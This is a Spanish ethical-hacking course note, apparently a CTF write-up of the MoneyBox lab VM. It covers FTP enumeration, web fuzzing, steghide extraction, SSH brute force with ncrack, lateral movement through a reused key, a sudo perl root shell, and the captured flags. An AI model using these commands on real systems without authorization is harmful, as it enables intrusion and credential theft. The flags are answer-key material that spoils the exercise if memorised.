---
title: "🖥️ Máquina: MoneyBox — Hacking Ético"
aliases:
  - MoneyBox
  - Máquina MoneyBox
  - VM MoneyBox
  - Writeup MoneyBox
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
---

# 🖥️ Máquina: MoneyBox

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** FTP anónimo · Fuzzing web · Esteganografía (steghide) · Fuerza bruta SSH (ncrack) · Movimiento lateral · Escalada de privilegios (sudo / perl)  
> **Descripción:** En esta práctica trabajaremos con una máquina que esconde información en una imagen mediante esteganografía, usa directorios secretos en la web para ocultar claves y requiere moverse lateralmente entre usuarios antes de escalar privilegios. El objetivo es obtener 3 flags.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.7`
* **`RHOST` (Víctima / MoneyBox):** Ej. `10.0.0.14`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina MoneyBox tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos con un escaneo completo de puertos TCP:

```bash
nmap -sT -p- 10.0.0.14
```

> [!info] Resultado
> El escaneo revela tres puertos abiertos:
> · 21/tcp — FTP
> · 22/tcp — SSH
> · 80/tcp — HTTP

Lanzamos un escaneo detallado para identificar versiones y configuraciones:

```bash
nmap -v -A -p21,22,80 10.0.0.14
```

> [!info] Resultado
> · El FTP corre vsftpd 3.0.3 con login anónimo habilitado. El escaneo revela que hay un archivo llamado trytofind.jpg en el directorio raíz del FTP.
> · El SSH corre OpenSSH 7.9p1.
> · El HTTP corre Apache 2.4.38 con el título de página MoneyBox.

---

## 📂 Fase 2: Exploración del FTP y descarga de la imagen

Accedemos al FTP como usuario anónimo y descargamos la imagen:

```bash
ftp 10.0.0.14
```

```bash
Name: anonymous
```

```bash
ftp> ls
```

> [!info] Resultado
> Confirmamos la presencia de trytofind.jpg. El nombre ya es una pista: nos invita a buscar algo dentro de ella. La descargamos:

```bash
ftp> get trytofind.jpg
```

---

## 🌐 Fase 3: Enumeración web y búsqueda de directorios

Inspeccionamos la página principal de la web, que no contiene nada relevante a simple vista. Usamos feroxbuster para buscar directorios y archivos ocultos mediante fuerza bruta. La opción -x añade extensiones a cada palabra del diccionario y -d 1 limita la profundidad de búsqueda a un nivel:

```bash
feroxbuster -u http://10.0.0.14 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -d 1
```

> [!info] Resultado
> Feroxbuster descubre el directorio /blogs/. Lo inspeccionamos:

```bash
curl http://10.0.0.14/blogs/
```

> [!info] Resultado
> En el código fuente de la respuesta encontramos un comentario HTML oculto:
> <!-- the hint is the another secret directory is S3cr3t-T3xt -->
> Nos indica la existencia de otro directorio secreto. Lo visitamos:

```bash
curl http://10.0.0.14/S3cr3t-T3xt/
```

> [!info] Resultado
> La página revela una clave oculta en un comentario:
> <!-- Secret Key 3xtr4ctd4t4 -->
> Esta clave 3xtr4ctd4t4 es la contraseña usada para ocultar información dentro de la imagen que descargamos del FTP.

---

## 🖼️ Fase 4: Esteganografía con steghide

La esteganografía es la técnica de ocultar información dentro de un archivo aparentemente inocente, como una imagen. A diferencia del cifrado, que hace el mensaje ilegible, la esteganografía oculta la propia existencia del mensaje.

Usamos steghide para extraer el contenido oculto dentro de trytofind.jpg usando la clave que encontramos. La opción extract extrae datos ocultos, -sf indica el archivo portador y -p la contraseña:

```bash
steghide extract -sf trytofind.jpg -p 3xtr4ctd4t4
```

> [!info] Resultado
> Se extrae un archivo data.txt con el siguiente contenido:
> Hello..... renu
> I tell you something Important. Your Password is too Weak So Change Your Password
> Don't Underestimate it.......
> Obtenemos un posible nombre de usuario: renu. El mensaje advierte que su contraseña es débil, lo que sugiere que podría ser vulnerable a un ataque de fuerza bruta.

---

## 🔐 Fase 5: Fuerza bruta SSH con ncrack

Con el usuario renu identificado y sabiendo que su contraseña es débil, usamos ncrack para intentar un ataque de fuerza bruta sobre el servicio SSH. La opción -u especifica el usuario y -P el diccionario de contraseñas:

```bash
ncrack -u renu -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-20.txt ssh://10.0.0.14
```

> [!info] Resultado
> ncrack encuentra las credenciales válidas:
> · Usuario: renu
> · Contraseña: 987654321
> Confirmando lo que el mensaje de la imagen advertía: una contraseña extremadamente débil.

---

## 🔑 Fase 6: Acceso SSH y primeras flags

Accedemos al sistema con las credenciales obtenidas:

```bash
ssh renu@10.0.0.14
```

```bash
Password: 987654321
```

Leemos la primera flag:

```bash
cat user1.txt
```

> [!info] Resultado
> Flag 1: us3r1{F14g:0ku74tbd3777y4}

Comprobamos si podemos leer la flag del segundo usuario directamente:

```bash
cat /home/lily/user2.txt
```

> [!info] Resultado
> Flag 2: us3r{F14g:tr5827r5wu6nklao}
> El archivo es legible porque sus permisos lo permiten. Sin embargo, para escalar privilegios necesitaremos acceder como lily, ya que es ella quien tiene permisos especiales en el sistema.

---

## ↔️ Fase 7: Movimiento lateral — de renu a lily

Tras obtener acceso inicial, uno de los primeros pasos es revisar el historial de comandos del usuario. El archivo .bash_history registra todos los comandos ejecutados anteriormente en la terminal y puede revelar contraseñas, rutas, herramientas usadas o, como en este caso, conexiones SSH realizadas en el pasado:

```bash
cat .bash_history
```

> [!info] Resultado
> El historial muestra que renu generó un par de claves SSH y las copió al servidor de lily:
> ssh-keygen -t rsa
> ssh-copy-id lily@192.168.43.80
> chmod 400 id_rsa
> ssh -i id_rsa lily@192.168.43.80
> Esto significa que la clave pública de renu fue añadida al archivo authorized_keys de lily, lo que permite a renu conectarse como lily sin contraseña usando su clave privada.

Verificamos que la clave pública de renu sigue en el archivo de claves autorizadas de lily:

```bash
cat /home/lily/.ssh/authorized_keys
```

> [!info] Resultado
> Confirmamos que la clave pública de renu está registrada como clave autorizada para lily. Esto significa que podemos usar la clave privada de renu (almacenada en ~/.ssh/id_rsa) para autenticarnos como lily directamente en el sistema local:

```bash
ssh -i .ssh/id_rsa lily@127.0.0.1
```

> [!info] Resultado
> Acceso exitoso como lily sin necesidad de contraseña.

---

## 🚀 Fase 8: Escalada de privilegios

Comprobamos qué comandos puede ejecutar lily como root:

```bash
sudo -l
```

> [!info] Resultado
> lily puede ejecutar /usr/bin/perl como root sin contraseña. Perl es un lenguaje de programación que permite ejecutar comandos del sistema directamente, por lo que si podemos lanzarlo como root, podemos obtener una shell con privilegios totales.

perl con la opción -e ejecuta código directamente desde la línea de comandos. La función exec reemplaza el proceso actual por el comando indicado, en este caso /bin/sh. Al ejecutarlo con sudo, el proceso hereda los privilegios de root:

```bash
sudo perl -e 'exec "/bin/sh";'
```

> [!info] Resultado
> Obtenemos una shell como root. Lo verificamos:

```bash
id
```

> [!info] Resultado
> uid=0(root) gid=0(root) groups=0(root)

Leemos la flag final de root:

```bash
cat /root/.root.txt
```

> [!info] Resultado
> Flag 3 (root): r00t{H4ckth3p14n3t}

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
